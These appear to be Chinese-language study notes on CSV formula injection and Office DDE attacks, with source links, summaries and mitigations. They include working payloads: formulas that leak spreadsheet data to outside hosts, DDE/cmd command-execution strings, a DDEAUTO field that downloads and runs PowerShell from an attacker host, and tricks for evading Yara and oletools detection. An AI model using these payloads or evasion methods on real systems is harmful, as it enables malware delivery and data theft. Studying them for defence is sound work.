# CSV注入与DDE

## ref

### CSV注入

[The Absurdly Underestimated Dangers of CSV Injection](https://georgemauer.net/2017/10/07/csv-injection.html)

[CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection)

[Comma Separated Vulnerabilities | Context Information Security UK](https://webcf.waybackmachine.org/web/20190605223931/https://www.contextis.com/en/blog/comma-separated-vulnerabilities) 这篇似乎是最早的一个揭示CSV注入和DDE攻击的blog，但现在这个网址已经解析到其他网站了

[CSV注入原理和预防 - 知乎](https://zhuanlan.zhihu.com/p/562520731)

[CSV注入攻击详解](https://blog.csdn.net/xiaoguanyusb/article/details/83623906)

### office DDE

#### 基础知识

[SensePost | Macro-less code exec in msword](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)

[Reviving DDE: Using OneNote and Excel for Code Execution | by Matt Nelson | Posts By SpecterOps Team Members](https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee)

[Office钓鱼攻击之DDE](https://www.jianshu.com/p/367d3bfd8c4c)

[Office DDE漏洞学习笔记 - 17bdw - 博客园](https://www.cnblogs.com/17bdw/p/8546380.html)

[PwnDizzle: Office Document Macros, OLE, Actions, DDE Payloads and Filter Bypass](https://pwndizzle.blogspot.com/2017/03/office-document-macros-ole-actions-dde.html)  包含了宏、ActiveX、OLE、Action、DDE、Filter等一系列office文件代码执行的手法

[利用Excel power query实现远程DDE执行 - 先知社区](https://xz.aliyun.com/t/5514?time__1311=n4%2BxnieWqDqmqx7qiKDsj3xCq7KwORGwTh02oTD)

[Microsoft Security Advisory 4053440 | Microsoft Learn](https://learn.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)  官方缓解手段

#### 武器化与payload混淆

[GitHub - 0xdeadbeefJERKY/Office-DDE-Payloads: Collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique.](https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads/tree/master) DDE payload生成工具

[decalage2/oletools: oletools - python tools to analyze MS OLE2 files (Structured Storage, Compound File Binary Format) and MS Office documents, for malware analysis, forensics and debugging.](https://github.com/decalage2/oletools)  OLE2文件解析工具

[From CSV to CMD to qwerty | Explore Security](https://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/)  这篇主要是记录一个DDE武器化的过程，通过DDE执行命令试图通过NTLMv2协议横向

[MSWord - Obfuscation with Field Codes | Staaldraad](https://staaldraad.github.io/2017/10/23/msword-field-codes/)  DDE混淆

[SensePost | Powershell, c-sharp and dde the power within](https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/)

## CSV Injection

### Comma Separated Vulnerabilities

很多软件提供了spreadsheet功能，让csv/xls文件可以下载数据，因此spreadsheet的单元格可能包含不可信来源的数据

#### Formula injection

用户可能通过插入公式的方式将表格内容泄露

```
=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")
```

#### Delivering exploits

DDE协议被Microsoft Excel  LibreOffice和Apache OpenOffice使用

后两者可以使用该语法调用

```
=DDE(server; file; item; mode)
```

可以通过指定一些特殊的参数来劫持计算机，如

```
=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
```

运行这类命令一般会弹窗提醒该文件包含其他链接的文件，但早年如CVE-2014-3524存在弹窗前就执行命令的情况

除此之外还有INFO等命令也可以访问外部链接，还可以使用IF...ELSE来投递合适的payload

#### Exploiting trust relationships

Excel执行命令的方式很简单

```
=cmd|' /C calc'!A0
```

微软很清楚这类命令有风险，因此会弹窗两次提醒

#### Remediation

缓解的最好方式就是对`= + - @`等开头的单元格使用`'`进行引用，防止其被翻译为公式

Update：这篇文章发现在16年有一些其他的绕过手法，上述使用`'`的方法还是会被`+ - @`绕过。这里介绍了一些更好的方法，包括在`= + - @`前添加`'`（excel在显示时会隐藏该符号），其他方法还有尽量删除输入内容的空格键，以及限制客户端输入的内容为数字和字母

下面OWASP的文章介绍了对于CSV注入一种比较好的转义方式

### The Absurdly Underestimated Dangers of CSV Injection

#### Attack Vector 1 命令执行

一些可以调用公式、执行命令的符号，如`= - + @` 等，在Excel中会被识别为公式执行，如

```
"=2+5"
```

而采用一些特殊语法可以触发更多命令

```
"=2+5+cmd|' /c calc'!A0"
```

#### Attack Vector 2 宏调用

如google文档可以使用宏来调用一些域外的接口，如

```csv
"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")"
```

这里将表中A2:E2区域的数据作为参数传出，因此存在数据泄露的风险。特别是在表格权限只使用账号进行区分时，可以在某张表上访问其他表的数据，从而使得所有的表都存在数据泄露风险

### OWASP CSV Injection

#### 攻击手法

主要有下列三种攻击手法

* 通过类似spreadsheet软件的漏洞劫持用户电脑，如CVE-2014-3524

* 若用户无视spreadsheet对外部链接的安全警告，可能从恶意网站下载恶意程序从而劫持用户电脑

* 从个人可访问的spreadsheet泄露数据

#### 缓解措施：

确保单元格不是以下列字符作为开头

* `=`

* `+`

* `-`

* `@`

* Tab(0x09)

* return(0x0D)

并且需要注意`, ; ' "`，因为攻击者可以通过这些字符作为单元格的分隔符或内容引用构造输入，绕过对单元格开头内容的检查

一种比较通用的转义方法为：

* 将每个单元格用`"`包裹

* 在每个单元格开头添加`'`

* 使用一个额外的`"`来转义用户输入中的`"`字符

例子：

| 输入            | 转义后               |
| ------------- | ----------------- |
| =1+2”;=1+2    | "'=1+2"";=1+2"    |
| =1+2'" ;,=1+2 | "'=1+2'"" ;,=1+2" |

## Office DDE

引文第一篇比较详细地说明了如何制作一个包含DDE payload的恶意docx文件

引文第二篇详细地描述了DDE漏洞相关的历史，以及缓解措施。并讲述了当时发现的在OneNote中引用Excel表格会出现DDE攻击，且该攻击可以绕过Excel本身设置的一些DDE保护措施

引文第六篇描述了在Excel power query中实现DDE攻击

### 攻击手法

主要的攻击手法是插入DDE相关的域代码，入口见引文第一篇

#### 基本payload

使用DDEAUTO，默认打开文档时会更新DDE引用的链接

```
# 代码执行
{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}

# 恶意文件下载
{ DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evilserver.ninja/pp.ps1');powershell -e $e "}
```

使用DDE则不会默认更新，此时需要更改docx文件的配置。具体将.docx文件重命名为.zip文件，导航到word/settings.xml，插入该XML内容

```
<w:updateFields w:val="true"/>
```

使用`= + - @`等运算符同样会触发命令执行

```
=cmd|' /c calc'!A0
@SUM(cmd|' /c calc'!A0)
```

#### 进阶payload

可以修改警示弹窗的文本内容

```
=MSEXCEL|'\..\..\..Windows\System32\cmd.exe /c calc.exe'!
```

此时会显示要打开的是MSEXCEL.exe而不是cmd.exe

DDE协议中除了DDE和DDEAUTO外可用的关键字还有（来自引文第四篇，见微软文档[[MS-OI29500]: DDE | Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/office_standards/ms-oi29500/a2c3a25a-1dba-40da-be7a-47cf63c78d55)）

```
GLOSSARY
IMPORT
INCLUDE
SHAPE
DISPLAYBARCODE
MERGEBARCODE
```

#### payload混淆

现在杀毒软件会存在DDE相关的yara检测规则，因此出现了一些绕过手段，下面是一些样本

[Macroless DOC malware that avoids detection with Yara rule – Furoner.CAT](https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/)

##### QUOTE域

文章中发现一种方法：使用[Field Code](https://support.microsoft.com/en-us/office/list-of-field-codes-in-word-1ad6d91a-55a7-4a8d-b535-cf7888659a51)进行混淆。这里使用了QUOTE域，注意，域在word理是可以嵌套的

此外，QUOTE可以将数字转换为字母，因此下列payload

```
{SET c "{QUOTE 65 65 65 65}"}
{SET d "{QUOTE 71 71 71 71}"}
{DDE {REF c} {REF d}}
```

最终的效果类似于

```
{DDE "AAAA" "GGGG"}
```

##### Dirty Links

虽然DDEAUTO理论上会在文档打开时自动刷新域内容，但不是所有域都会被刷新，因此需要额外指定一个属性。以压缩包形式打开docx文件，并修改document.xml中所有fldChar标签的dirty属性，该属性可以用于标记一个域的内容已经不再是最新的内容

```
<w:fldChar w:fldCharType="begin" w:dirty="true">
```

##### Hiding DDE

###### Yara

要隐藏DDE域，就需要对查杀规则进行了解。最早Nviso Labs使用下列Yara规则进行查杀

```
/<w:fldChar\s+?w:fldCharType="begin"\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>/
```

但该Yara可以被多行的混淆绕过，此外简单地对fldChar标签添加一些属性，如上面使用的dirty属性，就可以轻易地绕过上述Yara规则

###### oletools

作者又发现使用oletools可以直接分析出DDE执行的代码，因此作者找到了Office Open XML格式中除fldChar外的另一个用于引用的域标签fldSimple

```
<w:fldSimple w:instr='DDE "C:\\Windows\\System32\\cmd.exe" "/k powershell.exe"' w:dirty=""true>
    <w:r>
        <w:t>Pew</w:t>
    </w:r>
</w:fldSimple>
```

###### 副作用

如果既使用DDEAUTO，又设置了`w:dirty="true"`，文档打开时会提醒用户三次是否执行代码

##### No DDE

DDE混淆的终极目标是在文档中不出现任何DDE，文章中找到的方法是通过frames标签嵌入外部引用的文档。Word文档实际上有HTML解析以及嵌入HTML文档的功能，只不过在Word2016取消了该功能入口，但底层依然会解析这部分内容

同样将docx作为zip打开，并且在webSettings.xml的`<w:webSettings>`中加入下列内容

```xml
<w:frameset>
    <w:framesetSplitbar>
        <w:w w:val="60"/>
        <w:color w:val="auto"/>
        <w:noBorder/>
    </w:framesetSplitbar>
    <w:frameset>
        <w:frame>
            <w:name w:val="1"/>
            <w:sourceFileName r:id="rId1"/>
            <w:linkedToFile/>
        </w:frame>
    </w:frameset>
</w:frameset>
```

其中`rId1`是对外部文档的一个引用，该引用需要在`word/_rels`文件夹中添加（依然是将docx作为zip打开时），文件为`webSettings.xml.rels`

添加下列内容

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships 
    xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="http://x.x.x.x/simple.docx" TargetMode="External"/>
</Relationships>
```

其中Target属性即为外部的文档地址

由于文档本身是外部引用，Word默认使用保护视图浏览，但在保护视图下实际上无法正常预览文件，Word会有提示说明只有编辑模式才能正常预览，此时若用户切换了模式，外部文档就会被下载，并且会触发DDE（还是会有弹窗提醒）

#### XML标签混淆

[Macroless DOC malware that avoids detection with Yara rule – Furoner.CAT](https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/)

该篇文章介绍了一个使用一系列xml标签嵌套进行混淆的方法，主要是以`<w:instrText>`对实际payload进行包裹，两个标签之间插入一系列其他标签的方式

```
<w:instrText>"Dd</w:instrText></w:r> [其他标签]
<w:instrText>E"</w:instrText></w:r>
```

### 缓解

一系列与DDE相关的注册表

[Disable DDEAUTO for Outlook, Word, OneNote, and Excel versions 2010, 2013, 2016](https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b)

微软官方发布的缓解措施

[Microsoft Security Advisory 4053440 | Microsoft Learn](https://learn.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)
